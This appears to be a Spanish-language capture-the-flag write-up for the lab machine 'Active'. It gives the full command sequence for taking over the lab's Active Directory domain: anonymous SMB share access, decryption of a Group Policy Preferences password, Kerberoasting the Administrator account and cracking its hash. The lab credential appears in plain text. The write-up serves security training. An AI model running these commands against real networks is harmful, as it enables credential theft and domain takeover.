---
icon: desktop
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Active

`Active` es una máquina de dificultad fácil a media, que presenta dos técnicas muy frecuentes para obtener privilegios dentro de un entorno de Active Directory.

<figure><img src="../../../.gitbook/assets/Active.png" alt="" width="563"><figcaption></figcaption></figure>

## Reconnaissance

Realizaremos un escaneo sobre los puertos abiertos de la máquina Active.

```bash
nmap -p- --open -sS --min-rate 1000 -vvv -Pn -n 10.10.10.100 -oG allPorts
```

<figure><img src="../../../.gitbook/assets/703_vmware_98kd4quoYx.png" alt=""><figcaption></figcaption></figure>

Lanzaremos unos scripts con **Nmap** para intenter ver vulnerabilidades y versiones sobre los puertos abiertos encontrados.

{% code overflow="wrap" %}
```bash
nmap -sCV -p53,88,135,139,389,445,464,593,636,3268,3269,5722,9389,47001,49152,49153,49154,49155,49157,49158,49165,49166,49168 10.10.10.100 -oN targeted
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/702_vmware_rDAcKa5W44.png" alt=""><figcaption></figcaption></figure>

Comprobaremos el nombre del domninio a través del siguiente comando

```bash
ldapsearch -x -H ldap://10.10.10.100 -s base | grep defaultNamingContext
```

<figure><img src="../../../.gitbook/assets/704_vmware_aK8WYI4ygG.png" alt=""><figcaption></figcaption></figure>

Añadiremos en nuestro archivo **/etc/hosts** la dirección IP de Active y el dominio

```bash
catnp /etc/hosts | grep active.htb
```

<figure><img src="../../../.gitbook/assets/705_vmware_cDJv3NirhC.png" alt=""><figcaption></figcaption></figure>

## SMB Enumeration

Procederemos a la enumeración de SMB a través de **enum4linux** para ver que encontramos. Vemos que sin usuario podemos acceder a los recursos _IPC$_ y _Replication_.

```bash
enum4linux -a -u "" -p "" 10.10.10.100
```

<figure><img src="../../../.gitbook/assets/707_vmware_05U2IRlQw5.png" alt=""><figcaption></figcaption></figure>

Procederemos a acceder al recurso compartido "Replication" sin usuario, y nos descargaremos todo el contenido del recurso compartido en nuestro equipo local.

```
smbclient //10.10.10.100/Replication -N
```

<figure><img src="../../../.gitbook/assets/710_vmware_c1osikjLMd.png" alt=""><figcaption></figcaption></figure>

## Abusing GPP Passwords

### Decrypting GPP Passwords - gpp-decrypt - impacket-GetGPPPassword

Comprobaremos que tenemos un archivo .xml que pertenece a una política y se trata de la información de un usuario del Active Directory y un campo "cpasswd" que está encriptado utilizando una clave conocida, que es parte de la configuración predeterminada de la Política de Preferencias de Grupo de Windows (GPP).&#x20;

Para desencriptarlo podemos hacer uso de **gpp-decrypt** o **impacket-Get-GPPPassword**.

{% code overflow="wrap" %}
```bash
catnp Groups.xml

impacket-Get-GPPPassword -xmlfile Groups.xml 'LOCAL'

gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/712_vmware_oGnj8eke3T.png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (34).png" alt=""><figcaption></figcaption></figure>

## Flag user.txt

Comprobaremos a través de **netexec** de que podemos acceder con el usuario encontrado y su respectiva credencial. Comprobamos además de que tiene acceso al recurso compartido "Users".

```bash
netexec smb 10.10.10.100 -u SVC_TGS -p 'GPPstillStandingStrong2k18'  --shares
```

<figure><img src="../../../.gitbook/assets/713_vmware_MoOwsWrOmB.png" alt=""><figcaption></figcaption></figure>

Procederemos a conectarnos al SMB con estas nuevas credenciales y nos descargaremos el archivo "user.txt" que es la primera flag.

```bash
smbclient //10.10.10.100/Users -U active.htb/SVC_TGS
```

<figure><img src="../../../.gitbook/assets/715_vmware_cDLsh84FvU.png" alt=""><figcaption></figcaption></figure>

Comprobaremos el contenido de la flag de user.txt

```
catnp user.txt
```

<figure><img src="../../../.gitbook/assets/716_vmware_IgW1eZ4qb3.png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

### Kerberoasting Attack (GetUsersSPNs.py)

"Procederemos a realizar un ataque de Kerberoasting en busca de servicios en el dominio active.htb que estén vinculados a cuentas de usuario. El objetivo es obtener tickets de servicio Kerberos (TGS) asociados a estos servicios, los cuales podrán ser crackeados offline para intentar revelar las contraseñas de las cuentas de servicio."

Obtenemos el hash Krb5 del usuario "Administrator".

{% code overflow="wrap" %}
```bash
impacket-GetUserSPNs -dc-ip 10.10.10.100 active.htb/SVC_TGS:GPPstillStandingStrong2k18 -request
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/718_vmware_xhWpRLa1EQ.png" alt=""><figcaption></figcaption></figure>

Guardaremos el hash en un archivo de texto

```
catnp hash.txt
```

<figure><img src="../../../.gitbook/assets/719_vmware_qk94vfrOpO.png" alt=""><figcaption></figcaption></figure>

Procederemos a realizar ataque de fuerza bruta a través de un diccionario para desencriptar el hash encontrado. Finalmente hemos obtenido la contraseña.

```bash
john --format=krb5tgs hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

<figure><img src="../../../.gitbook/assets/720_vmware_SLuBZGyeFw.png" alt=""><figcaption></figcaption></figure>

Comprobamos que podemos acceder con usuario "Administrator" y encontrar su correspondiente flag de root.txt

```bash
smbclient //10.10.10.100/Users -U active.htb/Administrator
```

<figure><img src="../../../.gitbook/assets/721_vmware_pMqMPFXlgK.png" alt=""><figcaption></figcaption></figure>
